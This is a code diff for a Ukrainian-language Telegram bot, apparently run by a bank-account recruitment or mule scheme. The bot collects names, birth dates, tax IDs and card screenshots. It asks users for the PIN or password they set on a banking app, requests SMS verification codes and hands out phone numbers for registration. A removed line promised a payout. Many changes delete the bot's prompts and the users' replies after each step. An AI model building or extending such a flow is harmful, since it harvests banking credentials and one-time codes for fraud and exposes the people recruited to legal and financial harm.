@@ -36,6 +36,10 @@ def get_cancel_keyboard() -> ReplyKeyboardMarkup:
         is_persistent=True
     )
 
+@router.message(F.text == "/id")
+async def cmd_get_chat_id(message: Message):
+    await message.answer(f"ID цього чату: <code>{message.chat.id}</code>", parse_mode="HTML")
+
 @router.message(F.chat.type == "private", F.text == "❌ Скасувати")
 async def handle_cancel_registration(message: Message, state: FSMContext):
     """Обробник скасування процесу введення анкетних даних"""
@@ -43,6 +47,39 @@ async def handle_cancel_registration(message: Message, state: FSMContext):
     session = await db.get_session(client_id)
     if session and session['status'] in ('number_assigned', 'waiting_code'):
         return
+        
+    state_data = await state.get_data()
+    
+    # Видаляємо промпт ПІБ
+    pib_prompt_msg_id = state_data.get('pib_prompt_msg_id')
+    if pib_prompt_msg_id:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=pib_prompt_msg_id)
+        except Exception:
+            pass
+            
+    # Видаляємо промпти ІПН
+    ipn_prompt_msg_ids = state_data.get('ipn_prompt_msg_ids', [])
+    for msg_id in ipn_prompt_msg_ids:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=msg_id)
+        except Exception:
+            pass
+            
+    # Видаляємо вітальні повідомлення
+    welcome_msg_ids = state_data.get('welcome_msg_ids', [])
+    for msg_id in welcome_msg_ids:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=msg_id)
+        except Exception:
+            pass
+
+    # Видаляємо повідомлення користувача
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     await state.clear()
     await message.answer(
         "Введення даних скасовано. Напишіть /start, щоб почати спочатку.",
@@ -115,15 +152,23 @@ def is_no_screenshot_text(text: str) -> bool:
     return False
 
 @router.message(CommandStart(), F.chat.type == "private")
+@router.message(F.chat.type == "private", F.text.in_({"Розпочати знову", "🔄 Розпочати знову"}))
 async def cmd_start(message: Message, state: FSMContext):
     """Обробник команди /start для клієнта"""
     if message.from_user.id == ADMIN_ID:
-        from bot.handlers.admin import get_admin_keyboard
-        await message.answer(
+        from bot.handlers.admin import get_admin_keyboard, clear_previous_admin_messages, register_admin_message
+        msg = await message.answer(
             "Привіт, Адміне!\n\n"
             "Оберіть потрібну дію на клавіатурі нижче:",
             reply_markup=get_admin_keyboard()
         )
+        if state:
+            await clear_previous_admin_messages(message.chat.id, state, message.bot)
+            try:
+                await message.delete()
+            except Exception:
+                pass
+            await register_admin_message(msg, state)
         return
 
     client_id = message.from_user.id
@@ -154,7 +199,7 @@ async def cmd_start(message: Message, state: FSMContext):
             dob = dob_match.group(1)
             
             # Очищуємо стару екранну клавіатуру, якщо вона залишилась
-            await message.answer("Починаємо нову сесію верифікації...", reply_markup=get_cancel_keyboard())
+            msg1 = await message.answer("Починаємо нову сесію верифікації...", reply_markup=get_cancel_keyboard())
             
             welcome_text = (
                 f"Привіт! Знайдено ваші попередні дані верифікації:\n\n"
@@ -167,17 +212,19 @@ async def cmd_start(message: Message, state: FSMContext):
                 [InlineKeyboardButton(text="🔄 Використати ці дані", callback_data="autofill_use")],
                 [InlineKeyboardButton(text="✍️ Ввести нові дані", callback_data="autofill_new")]
             ])
-            await message.answer(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
+            msg2 = await message.answer(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
+            await state.update_data(welcome_msg_ids=[msg1.message_id, msg2.message_id])
             await state.set_state(RegistrationStates.waiting_pib_dob)
             return
 
     # Крок 1: Запитуємо ПІБ та Дату народження
-    await message.answer(
+    pib_msg = await message.answer(
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
         "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
         "(обов'язково пишіть все в одному повідомленні)",
         reply_markup=get_cancel_keyboard()  # Прибирає будь-які старі кнопки і дає кнопку скасування
     )
+    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
     await state.set_state(RegistrationStates.waiting_pib_dob)
 
 
@@ -235,12 +282,13 @@ async def handle_autofill_new(callback: CallbackQuery, state: FSMContext):
         await callback.message.delete()
     except Exception:
         await callback.message.edit_reply_markup(reply_markup=None)
-    await callback.message.answer(
+    pib_msg = await callback.message.answer(
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
         "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
         "(обов'язково пишіть все в одному повідомленні)",
         reply_markup=get_cancel_keyboard()
     )
+    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
     await state.set_state(RegistrationStates.waiting_pib_dob)
     await callback.answer()
 
@@ -249,6 +297,30 @@ async def process_pib_dob(message: Message, state: FSMContext):
     """Отримання ПІБ та Дати народження в одному повідомленні з валідацією наявності дати"""
     pib_dob = message.text.strip()
     
+    state_data = await state.get_data()
+    welcome_msg_ids = state_data.get('welcome_msg_ids', [])
+    pib_prompt_msg_id = state_data.get('pib_prompt_msg_id')
+    
+    # Видаляємо вітальні повідомлення
+    for msg_id in welcome_msg_ids:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=msg_id)
+        except Exception:
+            pass
+            
+    # Видаляємо попередній промпт ПІБ
+    if pib_prompt_msg_id:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=pib_prompt_msg_id)
+        except Exception:
+            pass
+            
+    # Видаляємо повідомлення користувача з введенням
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     # Спочатку шукаємо дату народження за регулярним виразом
     # Підтримує формати: DD.MM.YYYY, DD/MM/YYYY, DD-MM-YYYY, DD.MM.YY, DD,MM,YYYY та версії з пробілами
     date_match = re.search(r'\b(\d{1,2}[\.\-\/,]\d{1,2}[\.\-\/,]\d{2,4})\b', pib_dob)
@@ -257,13 +329,14 @@ async def process_pib_dob(message: Message, state: FSMContext):
         date_match = re.search(r'\b(\d{1,2}\s+\d{1,2}\s+\d{4})\b', pib_dob)
         
     if not date_match:
-        await message.answer(
+        err_msg = await message.answer(
             "Вибачте, ви не вказали Дату Народження.\n"
             "Будь ласка, напишіть Ваші ПІБ та Дату Народження разом:\n\n"
             "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
             "(обов'язково пишіть все в одному повідомленні)",
             parse_mode="Markdown"
         )
+        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
         return
         
     dob_raw = date_match.group(1)
@@ -275,34 +348,54 @@ async def process_pib_dob(message: Message, state: FSMContext):
     
     # Валідуємо, чи залишилось хоча б 2 слова для ПІБ
     if len(pib.split()) < 2 or len(pib) < 5:
-        await message.answer(
+        err_msg = await message.answer(
             "Будь ласка, введіть Ваші ПІБ повністю та Дату Народження:\n\n"
             "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
             "(обов'язково пишіть все в одному повідомленні)",
             parse_mode="Markdown"
         )
+        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
         return
         
     # Зберігаємо розпарсені дані окремо
     await state.update_data(pib=pib, dob=dob)
     
     # Крок 2: Запитуємо ІПН та відразу надсилаємо роз'яснення
-    await message.answer("Також напишіть Ваш ІПН будь ласка?")
-    await message.answer(
+    msg1 = await message.answer("Також напишіть Ваш ІПН будь ласка?")
+    msg2 = await message.answer(
         "Запитуємо ІПН виключно для перевірки через офіційні державні реєстри:\n"
         "• щоб переконатися, що немає відкритих проваджень\n"
         "• щоб перевірити, чи не було раніше співпраці з нашою компанією\n\n"
         "Важливо:\n"
         "Дані що Ви надаєте ніколи не будуть передані третім особам!"
     )
+    await state.update_data(ipn_prompt_msg_ids=[msg1.message_id, msg2.message_id])
     await state.set_state(RegistrationStates.waiting_ipn)
 
 @router.message(RegistrationStates.waiting_ipn, F.chat.type == "private")
 async def process_ipn(message: Message, state: FSMContext):
     """Отримання ІПН та перехід до підтвердження даних"""
     ipn = message.text.strip()
+    
+    state_data = await state.get_data()
+    ipn_prompt_msg_ids = state_data.get('ipn_prompt_msg_ids', [])
+    
+    # Видаляємо попередні промпти ІПН
+    for msg_id in ipn_prompt_msg_ids:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=msg_id)
+        except Exception:
+            pass
+            
+    # Видаляємо повідомлення користувача
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     if not ipn.isdigit() or len(ipn) != 10:
-        await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
+        err_msg = await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
+        await state.update_data(ipn_prompt_msg_ids=[err_msg.message_id])
         return
 
     await state.update_data(ipn=ipn)
@@ -365,12 +458,13 @@ async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bo
     except Exception:
         await callback.message.edit_reply_markup(reply_markup=None)
         
-    await callback.message.answer(
+    msg = await callback.message.answer(
         "Дані успішно прийнято! Номер буде надіслано до чату протягом 2-х хвилин.\n\n"
         "⚠️ *Зверніть увагу:* я автоматичний асистент. Якщо у вас виникнуть якісь труднощі, які я не зможу вирішити — до чату обов'язково підключиться наш менеджер.",
         parse_mode="Markdown",
         reply_markup=get_waiting_keyboard()
     )
+    await db.update_session_waiting_message_id(client_id, msg.message_id)
     await callback.answer("Дані підтверджено!")
 
     # Отримуємо унікальні назви банків для вибору адміном
@@ -424,10 +518,11 @@ async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
         await callback.message.delete()
     except Exception:
         await callback.message.edit_reply_markup(reply_markup=None)
-    await callback.message.answer(
+    pib_msg = await callback.message.answer(
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
         reply_markup=get_cancel_keyboard()
     )
+    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
     await state.set_state(RegistrationStates.waiting_pib_dob)
     await callback.answer("Почнемо заново!")
 
@@ -634,9 +729,18 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
     await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)
 
     if not remaining:
+        kbd = ReplyKeyboardMarkup(
+            keyboard=[
+                [KeyboardButton(text="🔄 Розпочати знову")],
+                [KeyboardButton(text="📋 Мої дані")]
+            ],
+            resize_keyboard=True,
+            one_time_keyboard=False,
+            is_persistent=True
+        )
         await message.answer(
-            "Роботу завершено. Дякуємо за співпрацю.",
-            reply_markup=ReplyKeyboardRemove()
+            "Роботу завершено. Дякуємо за співпрацю.\n\nНатисніть «🔄 Розпочати знову» нижче, щоб почати нову сесію верифікації.",
+            reply_markup=kbd
         )
         await db.close_session(client_id)
         
@@ -899,8 +1003,8 @@ async def process_card_screenshot(message: Message, state: FSMContext, bot: Bot)
 
         if card_full_match:
             success_text = (
-                f"Все чітко, картку {client_card} прийняв в роботу, очікуй виплату!\n\n"
-                f"Який пін-код чи пароль ставили на додаток?"
+                "Чудово, картку прийняв.\n\n"
+                "Який пін-код чи пароль ставили на додаток?"
             )
             await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
             await state.set_state(RegistrationStates.waiting_password)
@@ -924,13 +1028,15 @@ async def process_card_screenshot(message: Message, state: FSMContext, bot: Bot)
         import os
         photo_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "resources", "images", "bank.kd_cards_instruction.png")
         if os.path.exists(photo_path):
-            await message.answer_photo(photo=FSInputFile(photo_path), caption=error_text)
+            await message.answer_photo(photo=FSInputFile(photo_path))
+            await message.answer(error_text)
         else:
             await message.answer(error_text)
         return
     else:
         # Немає розпізнаних екранів (можливо, якась інша помилка чи текст від ШІ)
-        await message.answer(response)
+        clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+        await message.answer(clean_text)
         return
 
 @router.message(RegistrationStates.waiting_card_screenshot, F.chat.type == "private")
@@ -1013,12 +1119,13 @@ async def handle_edit_my_data(callback: CallbackQuery, state: FSMContext):
     except Exception:
         await callback.message.edit_reply_markup(reply_markup=None)
         
-    await callback.message.answer(
+    pib_msg = await callback.message.answer(
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
         "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
         "(обов'язково пишіть все в одному повідомленні)",
         reply_markup=ReplyKeyboardRemove()
     )
+    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
     await state.set_state(RegistrationStates.waiting_pib_dob)
     await callback.answer()
 
@@ -1136,7 +1243,8 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
         chat_history = chat_history[-10:] # Зберігаємо останні 10 повідомлень
         await state.update_data(chat_history=chat_history)
 
-        await message.answer(response, reply_markup=get_sms_request_keyboard())
+        clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+        await message.answer(clean_text, reply_markup=get_sms_request_keyboard())
         return
 
     # Якщо користувач не у стані анкетування, пропонуємо йому почати з команди /start
@@ -1261,8 +1369,8 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
 
                 if card_full_match:
                     success_text = (
-                        f"Все чітко, картку {client_card} прийняв в роботу, очікуй виплату!\n\n"
-                        f"Який пін-код чи пароль ставили на додаток?"
+                        "Чудово, картку прийняв.\n\n"
+                        "Який пін-код чи пароль ставили на додаток?"
                     )
                     await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                     await state.set_state(RegistrationStates.waiting_password)
@@ -1288,7 +1396,8 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                 import os
                 photo_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "resources", "images", "bank.kd_cards_instruction.png")
                 if os.path.exists(photo_path):
-                    await message.answer_photo(photo=FSInputFile(photo_path), caption=kd_prompt, reply_markup=ReplyKeyboardRemove())
+                    await message.answer_photo(photo=FSInputFile(photo_path), reply_markup=ReplyKeyboardRemove())
+                    await message.answer(kd_prompt)
                 else:
                     await message.answer(kd_prompt, reply_markup=ReplyKeyboardRemove())
                 await state.update_data(success_photo_id=photo.file_id)
@@ -1296,7 +1405,8 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                 await state.set_state(RegistrationStates.waiting_card_screenshot)
                 return
             else:
-                await message.answer(response)
+                clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+                await message.answer(clean_text)
                 return
 
         if "[SUCCESS_VERIFICATION]" in response:
@@ -1329,7 +1439,8 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                 await state.set_state(RegistrationStates.waiting_password)
                 return
 
-        await message.answer(response)
+        clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+        await message.answer(clean_text)
         return
         
     await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
@@ -1384,6 +1495,17 @@ async def trigger_sms_code_request(client_id: int, bot: Bot, state: FSMContext, 
     # Оновлюємо статус сесії на очікування коду
     await db.set_session_status(client_id, 'waiting_code')
     await state.update_data(last_code_request_time=current_time)
+
+    # Видаляємо повідомлення інструкції про завантаження додатку (якщо є)
+    if session.get('instruction_message_id'):
+        try:
+            await bot.delete_message(chat_id=client_id, message_id=session['instruction_message_id'])
+        except Exception as e:
+            print(f"Помилка видалення повідомлення інструкції у клієнта: {e}")
+        try:
+            await db.update_session_instruction_message_id(client_id, None)
+        except Exception as e:
+            print(f"Помилка оновлення instruction_message_id в БД: {e}")
     
     # Запускаємо таймер на 20 секунд для автоматичного сповіщення клієнта
     asyncio.create_task(schedule_waiting_code_reminder(client_id, bot))
